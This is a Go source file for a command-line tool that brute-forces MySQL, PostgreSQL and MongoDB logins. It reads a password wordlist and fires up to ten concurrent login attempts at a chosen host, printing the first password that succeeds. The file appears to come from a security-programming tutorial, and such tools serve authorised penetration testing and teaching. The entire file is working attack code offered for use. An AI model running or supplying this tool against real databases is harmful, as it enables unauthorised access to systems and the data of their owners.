package main

import (
	"database/sql"
	"log"
	"time"

	// Underscore means only import for
	// the initialization effects.
	// Without it, Go will throw an
	// unused import error since the mysql+postgres
	// import only registers a database driver
	// and we use the generic sql.Open()
	"bufio"
	"fmt"
	_ "github.com/go-sql-driver/mysql"
	_ "github.com/lib/pq"
	"gopkg.in/mgo.v2"
	"os"
)

// Define these at the package level since they don't change,
// so we don't have to pass them around between functions
var (
	username string
	// Note that some databases like MySQL and Mongo
	// let you connect without specifying a database name
	// and the value will be omitted when possible
	dbName        string
	host          string
	dbType        string
	passwordFile  string
	loginFunc     func(string)
	doneChannel   chan bool
	activeThreads = 0
	maxThreads    = 10
)

func loginPostgres(password string) {
	// Create the database connection string
	// postgres://username:password@host/database
	connStr := "postgres://"
	connStr += username + ":" + password
	connStr += "@" + host + "/" + dbName

	// Open does not create database connection, it waits until
	// a query is performed
	db, err := sql.Open("postgres", connStr)
	if err != nil {
		log.Println("Error with connection string. ", err)
	}

	// Ping will cause database to connect and test credentials
	err = db.Ping()
	if err == nil { // No error = success
		exitWithSuccess(password)
	} else {
		// The error is likely just an access denied,
		// but we print out the error just in case it
		// is a connection issue that we need to fix
		log.Println("Error authenticating with Postgres. ", err)
	}
	doneChannel <- true
}

func loginMysql(password string) {
	// Create database connection string
	// user:password@tcp(host)/database?charset=utf8
	// The database name is not required for a MySQL
	// connection so we leave it off here.
	// A user may have access to multiple databases or
	// maybe we do not know any database names
	connStr := username + ":" + password
	connStr += "@tcp(" + host + ")/" // + dbName
	connStr += "?charset=utf8"

	// Open does not create database connection, it waits until
	// a query is performed
	db, err := sql.Open("mysql", connStr)
	if err != nil {
		log.Println("Error with connection string. ", err)
	}

	// Ping will cause database to connect and test credentials
	err = db.Ping()
	if err == nil { // No error = success
		exitWithSuccess(password)
	} else {
		// The error is likely just an access denied,
		// but we print out the error just in case it
		// is a connection issue that we need to fix
		log.Println("Error authenticating with MySQL. ", err)
	}
	doneChannel <- true
}

func loginMongo(password string) {
	// Define Mongo connection info
	// mgo does not use the Go sql driver like the others
	mongoDBDialInfo := &mgo.DialInfo{
		Addrs:   []string{host},
		Timeout: 10 * time.Second,
		// Mongo does not require a database name
		// so it is omitted to improve auth chances
		//Database: dbName,
		Username: username,
		Password: password,
	}
	_, err := mgo.DialWithInfo(mongoDBDialInfo)
	if err == nil { // No error = success
		exitWithSuccess(password)
	} else {
		log.Println("Error connecting to Mongo. ", err)
	}
	doneChannel <- true
}

func exitWithSuccess(password string) {
	log.Println("Success!")
	log.Printf("\nUser: %s\nPass: %s\n", username, password)
	os.Exit(0)
}

func bruteForce() {
	// Load password file
	passwords, err := os.Open(passwordFile)
	if err != nil {
		log.Fatal("Error opening password file. ", err)
	}

	// Go through each password, line-by-line
	scanner := bufio.NewScanner(passwords)
	for scanner.Scan() {
		password := scanner.Text()

		// Limit max goroutines
		if activeThreads >= maxThreads {
			<-doneChannel // Wait
			activeThreads -= 1
		}

		// Test the login using the specified login function
		go loginFunc(password)
		activeThreads++
	}

	// Wait for all threads before returning
	for activeThreads > 0 {
		<-doneChannel
		activeThreads -= 1
	}
}

func checkArgs() (string, string, string, string, string) {
	// Since the database name is not required for Mongo or Mysql
	// Just set the dbName arg to anything.
	if len(os.Args) == 5 &&
		(os.Args[1] == "mysql" || os.Args[1] == "mongo") {
		return os.Args[1], os.Args[2], os.Args[3], os.Args[4], "IGNORED"
	}
	// Otherwise, expect all arguments.
	if len(os.Args) != 6 {
		printUsage()
		os.Exit(1)
	}
	return os.Args[1], os.Args[2], os.Args[3], os.Args[4], os.Args[5]
}

func printUsage() {
	fmt.Println(os.Args[0] + ` - Brute force database login
 
Attempts to brute force a database login for a specific user with
a password list. Database name is ignored for MySQL and Mongo,
any value can be provided, or it can be omitted. Password file
should contain passwords separated by a newline.
 
Database types supported: mongo, mysql, postgres
 
Usage:
  ` + os.Args[0] + ` (mysql|postgres|mongo) <pwFile>` +
		` <user> <host>[:port] <dbName>
 
Examples:
  ` + os.Args[0] + ` postgres passwords.txt nanodano` +
		` localhost:5432 myDb  
  ` + os.Args[0] + ` mongo passwords.txt nanodano localhost
  ` + os.Args[0] + ` mysql passwords.txt nanodano localhost`)
}

func main() {
	dbType, passwordFile, username, host, dbName = checkArgs()

	switch dbType {
	case "mongo":
		loginFunc = loginMongo
	case "postgres":
		loginFunc = loginPostgres
	case "mysql":
		loginFunc = loginMysql
	default:
		fmt.Println("Unknown database type: " + dbType)
		fmt.Println("Expected: mongo, postgres, or mysql")
		os.Exit(1)
	}

	doneChannel = make(chan bool)
	bruteForce()
}
